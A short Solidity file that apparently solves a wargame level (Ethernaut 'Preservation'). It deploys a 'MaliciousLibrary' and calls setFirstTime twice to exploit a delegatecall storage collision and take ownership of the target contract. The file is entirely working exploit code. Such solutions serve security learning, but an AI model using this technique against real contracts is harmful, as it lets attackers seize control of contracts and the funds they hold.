// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IPreservation {
    function setFirstTime(uint _timestamp) external;
}
contract MaliciousLibrary {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint _time) public {
        
        owner = tx.origin;
    }
}

contract getPreserveOwner {
    IPreservation public preserve;
    MaliciousLibrary public lib;

    constructor(address _presCon) public {
        preserve = IPreservation(_presCon);
        lib = new MaliciousLibrary();
    }

    function takeover() public {
        // step to set the storage owner as tx.origin
        preserve.setFirstTime(uint256(address(lib)));
        preserve.setFirstTime(0);
        
    }
}